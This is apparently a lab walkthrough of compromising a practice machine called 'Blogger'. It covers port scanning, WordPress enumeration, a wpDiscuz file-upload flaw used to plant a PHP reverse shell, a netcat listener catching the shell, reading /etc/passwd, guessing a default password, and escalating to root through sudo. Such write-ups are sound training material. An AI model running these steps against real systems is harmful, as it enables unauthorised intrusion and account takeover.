## MACHINE IP
```bash
192.168.161.217
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Tue Nov  4 15:44:35 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 192.168.161.217
Nmap scan report for 192.168.161.217
Host is up (0.24s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:1d:82:8f:5e:de:9a:00:a8:07:39:bd:ac:ad:d3:44 (RSA)
|   256 d7:b4:52:a2:c8:fa:b7:0e:d1:a8:d0:70:cd:6b:36:90 (ECDSA)
|_  256 df:f2:4f:77:33:44:d5:93:d7:79:17:45:5a:a1:36:8b (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Blogger | Home
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  4 15:45:36 2025 -- 1 IP address (1 host up) scanned in 61.22 seconds
```
## OPEN PORTS - ANALYSIS
```bash
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
## RECON
```bash
# Operating System                    // Found Post Initial foothold
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.7 LTS"
NAME="Ubuntu"
VERSION="16.04.7 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.7 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial

```
## ENUMERATION
```bash
# Port 80
sudo ffuf -r -c -w /usr/share/wordlists/dirb/common.txt -fc 404 -u $url/FUZZ | tee fuzz/ffuf-common
- Fuzzing found assets folder
- Found wordpress blog under  http://192.168.161.217/assets/fonts/blog/
- It resolves to blogger.pg add to /etc/hosts

# Wordpress enumeration 
- Possible user J@M3S from blog 

sudo wpscan --url http://blogger.pg/assets/fonts/blog/ -e ap --plugins-detection aggressive -t 24
[+] wpdiscuz
 | Location: http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/
 | Last Updated: 2025-10-25T10:54:00.000Z
 | Readme: http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
 | [!] The version is out of date, the latest version is 7.6.35
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/, status: 200
 |
 | Version: 7.0.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
 
[+] Upload directory has listing enabled: http://blogger.pg/assets/fonts/blog/wp-content/uploads/ 
 
- Google Fu wpdiscuz exploit found -> can upload a php reverse shell with a magic byte covering
  
# Upload 
- Upload a php reverse shell on the comment area which has a attach image and intercept with burp and upload
- Start a listener
- Access the file from http://blogger.pg/assets/fonts/blog/wp-content/uploads/ 
```
## INITIAL SHELL
```bash
sudo nc -nvlp 80
[sudo] password for kali:
listening on [any] 80 ...
connect to [192.168.45.156] from (UNKNOWN) [192.168.161.217] 36718
Linux ubuntu-xenial 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 10:58:45 up  2:05,  0 users,  load average: 0.00, 0.05, 0.23
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```
## PRIVILEGE ESCALATION
```bash
- There where more rabbit holes 
- cat /etc/passwd
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
james:x:1002:1002:James M Brunner,,,:/home/james:/bin/bash

- Found user vagrant
- Trying username as password
su vagrant
Password: vagrant
```
## ROOT | ADMINISTRATOR - PWNED
```bash
vagrant@ubuntu-xenial:/tmp$ sudo -l                                                           
Matching Defaults entries for vagrant on ubuntu-xenial:   
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
                                                                                              
User vagrant may run the following commands on ubuntu-xenial:                
    (ALL) NOPASSWD: ALL                                                                       
vagrant@ubuntu-xenial:/tmp$ sudo su      
root@ubuntu-xenial:/tmp# id              
uid=0(root) gid=0(root) groups=0(root)   
root@ubuntu-xenial:/tmp# whoami               
root                                  
```
